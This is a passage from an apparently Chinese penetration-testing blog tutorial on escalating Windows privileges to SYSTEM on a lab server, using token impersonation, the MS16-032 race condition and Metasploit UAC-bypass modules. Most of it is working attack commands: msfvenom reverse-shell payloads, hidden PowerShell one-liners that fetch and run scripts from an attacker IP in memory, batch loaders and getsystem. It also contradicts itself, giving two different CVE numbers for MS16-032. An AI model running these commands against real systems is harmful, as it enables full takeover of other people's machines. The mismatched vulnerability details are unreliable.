p.exe 主动向外连接 Kali 5555 端口，msf 监听端口收到全新会话： 日志提示：`Meterpreter session 1 opened` 这个新会话，就是**系统最高权限会话**。

**阶段 4：权限验证**

在新弹出的 meterpreter 控制台输入命令核验权限：

```bash
meterpreter > getuid
# 输出: NT AUTHORITY\SYSTEM（Windows 顶级系统权限）
meterpreter > getprivs
# 输出: 所有权限 Enabled 开启状态
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602698572_xnoxzm.webp)

> 优缺点总结：
>
> 优点：
>
> 1. 兼容性稳定，Win2008 R2 靶机几乎必成；
> 2. CLSID 手动指定，不用工具自动遍历耗时。
>
> 缺点：
>
> 1. 硬盘遗留 3 个文件：jp.exe、p.exe、p.bat，文件落地极易被杀毒软件删除拦截；
> 2. 服务器会留下操作日志，容易被管理员溯源排查；
>
> 因此仅作为备用兜底方案。
>

### 6. 动静分析
| 维度 | 方案 A (MSF 反射 ) | 方案 B (JuicyPotato) |
| --- | --- | --- |
| 文件落地 | 无 ✅ | JP.exe + BAT (~250KB) ❌ |
| 进程创建 | 创建新进程 | 创建新进程 |
| 网络连接 | 反连 + COM 本地 | 反连 + COM 本地 |
| 杀软感知 | 低 ( 无文件 ) | 高 (JuicyPotato 被标记 ) |
| 稳定性 | 中 (CLSID 敏感 ) | 高 |

### 7. 常见问题
| 问题 | 原因 | 解决 |
| --- | --- | --- |
| session ms16_075_reflection 无 | CLSID 不匹配或模块不稳定 | 遍历 CLSID 重试，或换方案 B |
| JuicyPotato 无反应 | CLSID 不匹配 | 换 CLSID 重试 |
| COM failed | CLSID 不匹配 | 换 CLSID 重试 |
| CreateProcessWithToken 失败 | 使用了不兼容的方式 | 改用 -t u 或 -t c |

## 方法二：MS16-032 内核漏洞(无文件落地)
什么是条件竞争（Race Condition）？  
核心：多个进程/线程，争抢同一个共享资源，执行顺序不受系统固定管控，先后次序随机；攻击者利用这种时序不确定性，篡改文件、权限、内存数据，实现越权操作。

### 1. 适用性验证
检测补丁：

```bash
# 在 Meterpreter shell 中执行
wmic qfe get hotfixid | findstr "KB3139914"
# 如果无输出 → 未打补丁，漏洞存在 ✓
# 如果有输出 → 已打补丁，漏洞不存在 ✗
```

转换编码格式：`chcp 65001`

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602700658_uxuqkf.webp)

系统版本确认：

```plain
systeminfo | findstr /i "2008"
# 确认输出包含 "Microsoft Windows Server 2008 R2"
```

适用版本：  
Windows 7 SP1 (x86/x64)  
Windows Server 2008 R2 SP1 (x64)    
Windows 8.1 (x86/x64)  
Windows Server 2012 / R2

### 2. 原理
MS16-032 (CVE-2016-0099) 是 Secondary Logon 服务 (seclogon) 的漏洞。该服务在处理线程句柄时存在竞争条件(Race Condition)：

1. Secondary Logon 服务本身，是用 SYSTEM 最高权限 在后台运行的系统服务；
2. 服务内部会调用 NtImpersonateThread 这个系统 API，作用是：模拟客户端线程的身份，用来实现 “其他身份运行程序” 的系统功能；
3. 系统把「模拟身份」和「执行代码」拆成了两个先后动作，两个动作中间，留出了一段极短的空闲时间窗口；
4. 攻击者抓住这个时间缝隙，抢先修改线程上下文（线程的权限、身份环境）；
5. 服务继续执行后续代码时，会沿用被篡改后的线程配置，最终以 SYSTEM 权限运行攻击者自定义代码，实现权限提升。

利用方式：PowerShell 漏洞脚本会不断循环、反复尝试抢占时序窗口（条件竞争成功率随机，需要多次重试），直到成功劫持权限，最终获取 SYSTEM 权限。

### 3. 核心无文件原理
`IEX(Invoke-Expression)` 是 PowerShell 内存执行命令：

脚本文件托管在你的 Kali 攻击机 HTTP 服务上，目标机器只会把脚本下载进内存运行，不会保存到本地磁盘；

Payload 载荷采用反射注入加载，同样只驻留内存，完美实现无文件落地。

### 4. 操作步骤  
**<u>方法一：终端命令执行</u>**

#### Step 1：蚁剑低权限会话迁移到MSF
```bash
# 生成 payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=7777 -f exe > payload.exe
```

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.23.131
set LPORT 7777
run 
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602701940_d38wy4.webp)

#### Step 2：Kali 攻击机前期准备
1. 下载 MS16-032 漏洞利用 PowerShell 脚本

```bash
# 下载Invoke-MS16-032.ps1漏洞脚本（原Empire框架内置提权脚本）
wget https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602704180_njdtth.webp)

2. MSF 生成反弹 Meterpreter 载荷（后续提权成功后调用）

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=7777 -f psh-reflection > sys_ms16032.ps1
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602707137_m6uydy.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602709487_i7bdjg.webp)

3. 开启 Python 简易 HTTP 服务（端口 8080） 作用：让目标 Windows 可以远程访问下载上面两个 ps1 脚本

```bash
python3 -m http.server 8080
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602711094_37fjaf.webp)

> 访问 `http://kali 的 IP:8080/`
>
> 或者
>
> 开启 Apache 网页服务
>
> 1. 把两个脚本放入 Apache 网站根目录
>
> `mv Invoke-MS16-032.ps1 shell.ps1 /var/www/html/`
>
> 2. 启动 Apache 服务
>
> `systemctl start apache2`
>
> 3. 验证：浏览器访问 `http://kali 的 IP/` 就能看到两个文件，目标机器 PowerShell 同样可以通过该地址远程下载脚本载入内存。
>

#### Step 3：在目标服务器执行命令
注：3 种方式，推荐批处理中转；如果不行，可以用 MSF 自带的模块

前提：已经通过蚁剑拿到目标低权限 WebShell（IIS/NETWORK SERVICE 权限），在终端执行命令

**方式一：BAT 中转单次执行(推荐，100% 避开引号解析问题)**

CMD 内执行整段命令：

```bash
echo @echo off > C:\Windows\Temp\ms16.bat && echo powershell -nop -w hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.131:8080/Invoke-MS16-032.ps1');Invoke-MS16-032 -Command 'powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.23.131:8080/sys_ms16032.ps1'')'" >> C:\Windows\Temp\ms16.bat && C:\Windows\Temp\ms16.bat
```

命令拆解：

1. `echo @echo off > C:\Windows\Temp\ms16.bat`创建空 bat 脚本，写入 `@echo off`
2. 下载 MS16-032 漏洞脚本到内存并加载：`IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.131:8080/Invoke-MS16-032.ps1')`
3. 调用提权函数，提权成功后执行 `-Command` 内部代码：以 SYSTEM 权限再次下载反弹 shell 脚本 `sys_ms16032.ps1` 内存运行，反弹会话回 Kali。
4. `C:\Windows\Temp\ms16.bat`运行刚刚生成的批处理脚本。

**方式二：直接 PowerShell(如果批处理不行)**

```bash
powershell -nop -w hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.131:8080/Invoke-MS16-032.ps1');Invoke-MS16-032 -Command 'powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.23.131:8080/sys_ms16032.ps1'')'"
```

命令拆解：

1. powershell 启动全局参数

```plain
powershell -nop -w hidden -exec bypass -c "......"
```

+ `powershell`：调用系统PowerShell程序
+ `-nop`  
全称 `-NoProfile`，不加载用户预设配置文件，减少日志痕迹、启动更快
+ `-w hidden`  
全称 `-WindowStyle Hidden`，完全隐藏PowerShell弹窗，后台静默运行，不会弹出黑窗口被发现
+ `-exec bypass`  
绕过Windows默认PowerShell执行策略（系统默认禁止执行远程ps1脚本，这条参数必须加）
+ `-c "内容"`  
全称 `-Command`，双引号包裹内部所有代码，交给PowerShell解析执行 
2. 双引号内部内容

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.131:8080/Invoke-MS16-032.ps1')
```

+ `New-Object Net.WebClient`：创建网络下载工具对象
+ `.DownloadString(网址)`：访问Kali的HTTP服务，把漏洞脚本以文本形式读取进内存
+ `IEX()`：内存执行命令，读取到的脚本字符串直接运行，**不保存到磁盘**  
✅ 效果：加载MS16-032漏洞利用脚本，注册提权函数 `Invoke-MS16-032`
+ `;`：命令分隔符，执行完上段，再运行下段提权代码

```powershell
Invoke-MS16-032 -Command 'powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.23.131:8080/sys_ms16032.ps1'')'
```

+ `Invoke-MS16-032`：调用MS16-032漏洞函数，触发seclogon服务条件竞争漏洞，提升权限至SYSTEM
+ `-Command 'xxx'`  
  含义：**提权成功拿到SYSTEM权限之后，执行单引号内部的整套命令**
    - 层级2包裹符：**单引号 ' '**
3. 单引号内部内容：

```powershell
powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.23.131/sys_ms16032.ps1'')
```

作用：以SYSTEM最高权限，再次远程下载 `sys_ms16032.ps1`（反弹Meterpreter木马脚本），内存运行，主动回连Kali监听端口

最内层网址：`''` 两个连续单引号（转义关键）

PowerShell语法规则：  
单引号包裹的字符串里，想要书写1个字面单引号，必须写**两个单引号**做转义  
解析完成后，会自动识别为：  
`'http://192.168.23.131:8080/sys_ms16032.ps1'`  
如果只写一个单引号，引号会提前闭合，整条命令直接报错中断。

**完整执行时序**

Kali 硬盘存放文件 → 目标每次按需内存拉取 → 循环触发条件竞争提权 → SYSTEM 权限内存运行反弹木马 → 拿到最高权限会话，全程无磁盘落地。

**方式三：BAT 循环延时执行**

如果第一次失败，循环尝试(竞争条件需要多次触发)：把原本单次执行的 MS16-032 提权代码，封装进**for 循环**，自动连续执行

```plain
echo @echo off > C:\Windows\Temp\ms16_loop.bat && echo for /L %%i in (1,1,5) do ( >> C:\Windows\Temp\ms16_loop.bat && echo powershell -nop -w hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.131:8080/Invoke-MS16-032.ps1');try { Invoke-MS16-032 -Command 'powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.23.131:8080/sys_ms16032.ps1'')' } catch {}" >> C:\Windows\Temp\ms16_loop.bat && echo timeout /t 2 /nobreak >> C:\Windows\Temp\ms16_loop.bat && echo ) >> C:\Windows\Temp\ms16_loop.bat && C:\Windows\Temp\ms16_loop.bat
```

命令拆解：

1. `echo @echo off > C:\Windows\Temp\ms16_loop.bat`创建空循环批处理文件

> `> `覆盖写入，新建文件
>
> 文件首行：`@echo off`关闭命令回显，静默运行不打印日志
>

2. `echo for /L %%i in (1,1,5) do ( >> C:\Windows\Temp\ms16_loop.bat`写入 for 循环起始语句

> **for /L 循环语法释义**
>
> `for /L %%i in (起始值,步长,结束值)`
>
> 这里 `(1,1,5)`：
>
> 循环变量 i 从 1 开始，每次 + 1，循环一共执行 5 次
>
> do ( 代表：大括号内部是每一轮要重复执行的代码
>
> `>> `追加写入，不会清空前面内容
>

3. 中间PowerShell整段代码写入

```plain
echo powershell -nop -w hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.131:8080/Invoke-MS16-032.ps1');try { Invoke-MS16-032 -Command 'powershell -nop -w hidden -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.23.131:8080/sys_ms16032.ps1'')' } catch {}" >> C:\Windows\Temp\ms16_loop.bat
```

向bat循环体内写入核心提权指令

+ `-nop`：不加载用户PowerShell配置文件
+ `-w hidden`：隐藏PowerShell黑窗口
+ `-exec bypass`：绕过系统默认脚本执行限制
+ `IEX+DownloadString`：远程拉取脚本仅载入内存，无文件落地硬盘
+ `try{} catch{}`：异常捕获  
单次条件竞争提权失败、网络报错全部被捕获，不会中断整体循环，直接进入下一轮重试
+ 内层`''`：单引号转义语法，保证网址引号解析正常
4. `echo timeout /t 2 /nobreak >> C:\Windows\Temp\ms16_loop.bat`写入延时等待指令
+ `timeout /t 2`：每轮提权结束后暂停2秒钟
+ `/nobreak`：键盘按键无法打断倒计时  
作用：给系统线程调度留出间隙，提升条件竞争触发成功率，防止服务卡死
5. `echo ) >> C:\Windows\Temp\ms16_loop.bat`写入循环闭合右括号，补齐for循环语法结尾，整套循环结构完整闭合
6. `&& C:\Windows\Temp\ms16_loop.bat`运行刚刚全部生成完毕的循环批处理脚本
7. `&&`规则：前面所有步骤无报错，才会执行运行脚本操作

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602713236_sheloq.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602715214_oewuc7.webp)

这个方法太吃运气了，竞争不了一点啊啊啊啊！！！

换一个方法，注意不要退出刚刚那个会话，而是将会话放到后台运行

```bash
bg
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602717923_uj5ta7.webp)

**<u>方法二：MSF 模块直接利用</u>**

```bash
search ms16_032
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602719789_7rgk35.webp)

```bash
# 加载MS16-032专用本地提权模块
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
# 指定需要提权的低权限meterpreter会话（蚁剑转入MSF的初始会话，根据实际情况）
set SESSION 1
# 设置反弹回连参数
set LHOST 192.168.23.131
# 更换新端口
set LPORT 8888
# 自动运行模块，内部循环触发竞争条件提权
run
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602722969_fr4c5y.webp)

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602725242_d1b6tr.webp)

力竭了！！！

#### Step 4：验证
```bash
# 攻击机 MSF 中
msf6 > sessions
Active sessions
Id Name Type Information
1 meterpreter x64/windows NT AUTHORITY\NETWORK SERVICE @ WEBSERVER
2 meterpreter x64/windows NT AUTHORITY\SYSTEM @ WEBSERVER ← 成功
meterpreter > getuid
# 输出: Server username: NT AUTHORITY\SYSTEM
```

## 方法三：MSF BypassUAC(无文件落地 ✅)
UAC 是什么？

**UAC = 用户账户控制（User Account Control）** 

Windows 安全防护机制： 即便账号隶属于**管理员组 Administrators**，日常运行程序只会拿到**受限管理员令牌**； 一旦要修改系统核心配置、写入系统目录、安装程序，系统会弹出授权弹窗，用户点确认才会授予完整管理员权限。

绕过这套弹窗校验的操作，就叫做 **Bypass UAC（UAC 绕过）**

### 1. 适用性说明
BypassUAC 生效必要条件：

当前登录用户 必须属于本地 Administrators 管理员组

1. ✅ 可用场景：账号在管理员组，仅仅被 UAC 限制了权限

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602727547_1tee2l.webp)

2. ❌ 不可用场景：当前权限是 NETWORK SERVICE、普通来宾用户、IIS默认程序池权限（不在管理员组）

```bash
# 检查当前用户是否在 Administrators 组
whoami /groups | findstr "S-1-5-32-544"
# 有输出 → 在 Administrators 组，BypassUAC 可用 ✓
# 无输出 → 不在 Administrators 组，BypassUAC 不可用 ✗
```

### 2. Windows Server 2008 R2 可用的 BypassUAC 模块
| 模块 | 适用版本 | 原理 |
| :---: | :---: | :---: |
| bypassuac | 2008 R2 ✓ | COM IFileOperation 劫持 |
| bypassuac_fodhelper | Win10+ | FodHelper 注册表劫持 |
| bypassuac_eventvwr | 2008 R2 ✓ | 事件查看器注册表劫持 |
| bypassuac_comhijack | 2008 R2 ✓ | COM 接口劫持 |
| bypassuac_injection | 2008 R2 ✓ | 进程注入 |

bypassuac 和 bypassuac_eventvwr 在 Windows Server 2008 R2 上最稳定。

### 3. 原理：bypassuac 模块
Windows 的 UAC 机制通过 IAccessible 接口和 IFileOperation COM 对象实现白名单程序提权。bypassuac 模块利用以下流程：

1. 当前账号属于管理员组，但是所持令牌被 UAC 裁剪，权限不全
2. 调用系统 COM 组件 IFileOperation，该组件默认会以高完整性级别（不受 UAC 限制）启动
3. 利用 COM 劫持 / DLL 劫持技术，篡改组件调用逻辑
4. 高权限进程加载我们的恶意后门代码静默执行
5. 成功绕过弹窗校验，获取完整管理员权限

### 4. 操作步骤
前提：当前 Meterpreter 会话的用户在 Administrators 组。

#### 阶段 1：前置校验
1. 打开 meterpreter 会话，查看当前用户。

```bash
meterpreter > getuid
```

2. 核查是否在管理员组

```bash
shell
whoami /groups | findstr S-1-5-32-544
exit
```

![](https://img.jasmine-iris.top/posts/Windows-提权/1786602729352_1acqp8.webp)

有输出 = 符合条件，可以绕过 UAC

+ `whoami /groups`查看当前进程所属的全部用户权限组列表
+ `|`管道符：把前一条命令输出的所有文字，交给后面命令处理
+ `findstr`：Windows 自带字符串查找命令（等同于 Linux 里 grep）

作用：在一堆文本里，检索是否包含 `S-1-5-32-544` 字符串

+ `S-1-5-32-544`：SID，对应本地管理员组 Administrators
3. 把会话放到后台，退回MSF6控制台

```bash
background
```

#### 阶段 2：UAC 绕过模块配置并执行
Scenario A：直接在 Meterpreter 中使用 bypassuac

```bash
# 加载基础UAC绕过模块
use exploit/windows/local/bypassuac

# 逐项配置模块参数
set SESSION 1                      # 指定后台存放的meterpreter会话序号
set PAYLOAD windows/meterpreter/reverse_tcp  # 64位系统反弹载荷
set LHOST 192.168.23.131           # 攻击机Kali本机IP（接收反弹会话）
set LPORT 9999                    # 自定义监听端口

# 执行漏洞利用，静默绕过UAC
run
```

运行成功：MSF 会生成一条**高完整性级别**的全新 Meterpreter 会话。

Scenario B：使用 bypassuac_eventvwr（事件查看器劫持）

原理：劫持 eventvwr.msc 事件查看器启动时的注册表读取逻辑，高权限加载恶意载荷

```plain
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.23.131
run
```

适配：Win7、Windows Server2008R2、早期 Win10 版本，老系统稳定性极强，新版 Windows 已被补丁修复

Scenario C：使用 bypassuac_comhijack（COM 组件劫持）

原理：劫持系统 COM 接口，利用系统进程权限上下文绕过 UAC 校验

```plain
use exploit/windows/local/bypassuac_comhijack
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.23.131
run
```

适配范围最广，未加固的 Win10/Win11 均可尝试，实战渗透最常用

#### 阶段 3：最终提权至 SYSTEM + 权限验证
```bash
# 1. 查看当前身份：用户名不变，但权限完整性已提升
getuid

# 2. 通过管道模拟技术提升至SYSTEM最高权限
getsystem
# 成功回显：got system via technique 1 (Named Pipe Impersonation)

# 3. 最终核验系统权限
getuid
# 最终结果：NT AUTHORITY\SYSTEM
```

### 5. 两种提权路线
**路线 1：低权限身份（NETWORK SERVICE）→ 直达 SYSTEM**

无需接触 UAC，完全绕开这套机制

两种方式任选其一：

1. JuicyPotato/SweetPotato 土豆系列令牌模拟提权
2. MS16-032 内核条件竞争漏洞提权

最终直接拿到系统最高权限 NT AUTHORITY\SYSTEM

**路线 2：受限管理员 → BypassUAC → 完整管理员 → getsystem → SYSTEM**

适用：已经拿到管理员账号，但被 UAC 拦截，无法执行系统级操作

步骤：

1. MSF 内置模块绕过 UAC，提升进程完整性级别
2. 使用 getsystem 命令，进一步提升至 SYSTEM 权限

## 方法总结与优先级
| 优先级 | 提权方案 | 是否无文件落地 | 前置适用条件 | 系统版本范围 |
| :---: | :---: | :---: | :---: | :---: |
| 1 | MSF Reflection（令牌反射提权） | ✅ 纯内存执行，不写入磁盘 | 账户拥有 `SeImpersonatePrivilege`<br/>（模拟权限）NETWORK SERVICE/IIS 默认自带此权限 | Win7~Win10 全版本、服务器系统通用 |
| 2 | MS16-032（CVE-2016-3309 内核漏洞） | ✅ 可通过 PowerShell 内存加载，无落地 | 目标未安装安全补丁 **KB3139914** | 仅 Win7、Windows Server 2008 R2 老旧未打补丁系统 |
| 3 | BypassUAC 系列（eventvwr/comhijack/ 原版） | ✅ MSF 内存载荷，无需上传程序 | 当前用户归属 **Administrators 管理员组** | Win7 ~ Win11 主流 Windows 系统 |
| 备选兜底 | JuicyPotato / SweetPotato（土豆系列） | ❌ 必须上传 EXE 程序落地磁盘运行 | 账户具备`SeImpersonatePrivilege`<br/>模拟权限 | Win7 ~ Win10 全版本 |

